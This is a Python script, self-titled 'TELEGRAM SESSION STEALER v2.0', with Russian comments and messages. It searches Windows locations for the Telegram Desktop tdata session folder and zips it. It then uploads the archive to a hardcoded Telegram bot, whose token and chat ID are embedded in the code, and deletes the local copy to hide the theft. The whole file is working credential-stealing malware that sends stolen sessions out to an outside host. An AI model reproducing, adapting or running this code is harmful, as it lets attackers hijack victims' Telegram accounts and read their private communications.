import os
import sys
import subprocess

# === УСТАНОВКА ЗАВИСИМОСТЕЙ ===
def install_requests():
    try:
        import requests
        print("[✓] Библиотека requests уже установлена.")
        return True
    except ImportError:
        print("[*] Устанавливаю requests...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            print("[✓] requests установлена.")
            return True
        except Exception as e:
            print(f"[!] Ошибка установки: {e}")
            return False

if not install_requests():
    input("Нажми Enter для выхода...")
    sys.exit()

# === ОСНОВНОЙ КОД ===
from pathlib import Path
import shutil
import requests
import time

BOT_TOKEN = "8719549559:AAFuky0ZTDGoibclNUPRKWCrl_ODOdQBOCM"
CHAT_ID = "-1004353662613"

def find_tdata_manual():
    """Предлагает пользователю ввести путь вручную"""
    print("\n[?] Не удалось найти папку tdata автоматически.")
    print("    Укажите путь к папке, где хранятся данные Telegram.")
    print("    Например: C:\\Users\\Имя\\AppData\\Roaming\\Telegram Desktop\\tdata")
    user_path = input("[>] Путь: ").strip()
    if user_path:
        p = Path(user_path)
        if p.exists():
            return p
        else:
            print("[!] Указанный путь не существует.")
    return None

def find_tdata_path():
    """Ищет папку с сессией Telegram во всех возможных местах"""
    
    # Список всех возможных путей
    possible_paths = [
        # Стандартный путь (обычная версия)
        Path.home() / "AppData" / "Roaming" / "Telegram Desktop" / "tdata",
        # Путь для Microsoft Store (UWP)
        Path.home() / "AppData" / "Local" / "Packages" / "TelegramMessengerLLP.TelegramMessenger" / "LocalCache" / "Roaming" / "TelegramDesktop" / "tdata",
        # Альтернативный путь для UWP (могут быть разные ID)
        Path.home() / "AppData" / "Local" / "Packages" / "TelegramMessengerLLP.TelegramDesktop" / "LocalCache" / "Roaming" / "TelegramDesktop" / "tdata",
        # Путь для Portable версии
        Path.cwd() / "Telegram" / "tdata",
        # Путь в Program Files (редко, но бывает)
        Path("C:/Program Files/Telegram Desktop/tdata"),
        # Путь в папке пользователя (если перенесли)
        Path.home() / "Telegram" / "tdata",
    ]
    
    # Проверяем все пути
    for p in possible_paths:
        if p.exists():
            return p
    
    # Если не нашли — ищем в Packages с перебором
    packages_path = Path.home() / "AppData" / "Local" / "Packages"
    if packages_path.exists():
        for pkg in packages_path.iterdir():
            if pkg.is_dir() and "Telegram" in pkg.name:
                # Пробуем разные варианты внутри папки пакета
                test_paths = [
                    pkg / "LocalCache" / "Roaming" / "TelegramDesktop" / "tdata",
                    pkg / "LocalCache" / "Roaming" / "TelegramDesktop",
                    pkg / "Roaming" / "TelegramDesktop" / "tdata",
                    pkg / "LocalState" / "tdata",
                ]
                for tp in test_paths:
                    if tp.exists():
                        return tp
    
    # Если ничего не нашли — спрашиваем вручную
    manual_path = find_tdata_manual()
    if manual_path:
        return manual_path
    
    return None

def backup_tdata():
    print("[*] Ищем папку с сессией Telegram...")
    tdata_path = find_tdata_path()
    
    if not tdata_path:
        print("[-] Папка tdata не найдена.")
        print("[!] Убедитесь, что Telegram установлен и вы залогинены.")
        return None
    
    print(f"[+] Найдена папка: {tdata_path}")
    
    # Проверяем, что внутри есть файлы сессии
    files = list(tdata_path.glob("*.map")) + list(tdata_path.glob("*.key"))
    if not files:
        print("[-] В папке нет файлов сессии (.map, .key).")
        print("[!] Возможно, сессия не сохранена или Telegram не закрыт.")
        return None
    
    print(f"[+] Найдено {len(files)} файлов сессии.")
    
    # Определяем имя архива
    archive_name = f"tdata_backup_{int(time.time())}"
    archive_path = shutil.make_archive(archive_name, "zip", tdata_path)
    
    print(f"[+] Архив создан: {archive_path}")
    file_size_mb = os.path.getsize(archive_path) / (1024 * 1024)
    print(f"[+] Размер: {file_size_mb:.2f} МБ")
    
    return archive_path

def send_to_telegram(archive_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(archive_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": CHAT_ID, "caption": "☠️ Telegram session (tdata)"}
        try:
            r = requests.post(url, files=files, data=data)
            if r.status_code == 200:
                print("[+] Отправлено в Telegram!")
            else:
                print(f"[-] Ошибка отправки: {r.text}")
        except Exception as e:
            print(f"[-] Ошибка соединения: {e}")

def self_delete(archive_path):
    """Удаляет архив после отправки"""
    if archive_path and os.path.exists(archive_path):
        try:
            os.remove(archive_path)
            print("[*] Архив удалён с диска.")
        except Exception as e:
            print(f"[!] Не удалось удалить архив: {e}")

if __name__ == "__main__":
    print("=" * 50)
    print("     TELEGRAM SESSION STEALER v2.0")
    print("=" * 50)
    print()
    
    archive = None
    try:
        archive = backup_tdata()
        if archive:
            send_to_telegram(archive)
        else:
            print("\n[!] Сессия не найдена.")
            print("    Попробуй:")
            print("    1. Запустить Telegram и войти в аккаунт")
            print("    2. Закрыть Telegram (чтобы сессия сохранилась)")
            print("    3. Запустить скрипт снова")
    except Exception as e:
        print(f"[!] Критическая ошибка: {e}")
    finally:
        self_delete(archive)
    
    print("\n[*] Завершено.")
    input("Нажми Enter для выхода...")
